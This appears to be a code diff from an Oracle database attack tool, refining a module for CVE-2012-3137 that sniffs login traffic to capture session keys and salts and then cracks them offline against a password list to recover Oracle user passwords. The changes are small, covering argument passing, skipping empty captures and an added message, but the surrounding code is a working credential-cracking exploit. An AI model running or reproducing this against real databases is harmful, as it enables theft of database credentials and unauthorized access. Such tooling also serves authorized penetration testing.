@@ -106,13 +106,13 @@ class CVE_2012_3137 ():
 		scapyall.sniff(filter="tcp and host {0} and port {1}".format(ip,port), count=self.MAX_PACKET_TO_CAPTURE, timeout=self.TIMEOUT, stop_filter=customAction,store=False)
 		return sessionKey, salt
 
-	def __try_to_connect__(self, args):
+	def __try_to_connect__(self, user):
 		'''
 		Establish a connection to the database
 		'''
 		import cx_Oracle
 		try:
-			connectString = "{0}/{1}@{2}:{3}/{4}".format(self.args['user'], 'aaaaaaa', self.args['server'], self.args['port'], self.args['sid'])
+			connectString = "{0}/{1}@{2}:{3}/{4}".format(user, 'aaaaaaa', self.args['server'], self.args['port'], self.args['sid'])
 			logging.debug("Connecting with {0}".format(connectString))
 			cx_Oracle.connect(connectString)
 		except Exception, e:
@@ -127,7 +127,7 @@ class CVE_2012_3137 ():
 		logging.debug("Waiting 3 seconds")
 		sleep(3)
 		logging.debug("Connection to the database via a new thread with the username {0}".format(self.args['user']))
-		b = Thread(None, self.__try_to_connect__, None, (), {'args':self.args})
+		b = Thread(None, self.__try_to_connect__, None, (), {'user':user})
 		b.start()
 		b.join()
 		a.join()
@@ -185,21 +185,24 @@ class CVE_2012_3137 ():
 			fsession = open(sessionFile)
 			for session in fsession:
 				user, session_hex, salt_hex = session.replace('\n','').replace('\t','').split(self.separator)
-				self.args['print'].subtitle("Searching the password of the {0} user".format(user))
-				fpasswd = open(passwdFile)
-				pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=nbpasswds).start(), 0
-				for password in fpasswd:
-					nb +=1
-					pbar.update(nb)
-					password = password.replace('\n','').replace('\t','')
-					session_id = self.__decryptKey__(session_hex.decode('hex'),salt_hex.decode('hex'),password)
-					if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
-						self.passwdFound.append([user,password])
-						self.args['print'].goodNews("{0} password:{1}".format(user,password))
-						fpasswd.close()
-						break
-				fpasswd.close()
-				pbar.finish()
+				if session_hex=='[]' or salt_hex=='[]':
+					logging.info("There is not salt or session for '{0}', nothing to do!".format(user))
+				else:
+					self.args['print'].subtitle("Searching the password of the {0} user".format(user))
+					fpasswd = open(passwdFile)
+					pbar,nb = ProgressBar(widgets=['', Percentage(), ' ', Bar(),' ', ETA(), ' ',''], maxval=nbpasswds).start(), 0
+					for password in fpasswd:
+						nb +=1
+						pbar.update(nb)
+						password = password.replace('\n','').replace('\t','')
+						session_id = self.__decryptKey__(session_hex.decode('hex'),salt_hex.decode('hex'),password)
+						if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
+							self.passwdFound.append([user,password])
+							self.args['print'].goodNews("{0} password:{1}".format(user,password))
+							fpasswd.close()
+							break
+					fpasswd.close()
+					pbar.finish()
 			fsession.close()
 			return self.passwdFound
 
@@ -272,7 +275,7 @@ def runCVE20123137Module(args):
 			cve.getPasswords()
 			keys = cve.getKeys()
 			if keys != []:
-				args['print'].goodNews("Here are keys:\n\n{0}".format('\n'.join(keys)))
+				args['print'].goodNews("Here are keys:\n\n{0}\n\nIf for some users keys are empty, there was an error during capture or this Oracle user does not exist on the database".format('\n'.join(keys)))
 				filename = "sessions-{0}-{1}-{2}{3}".format(args['server'],args['port'],args['sid'],CHALLENGE_EXT_FILE)
 				f = open(filename,"w")
 				f.write('\n'.join(keys))
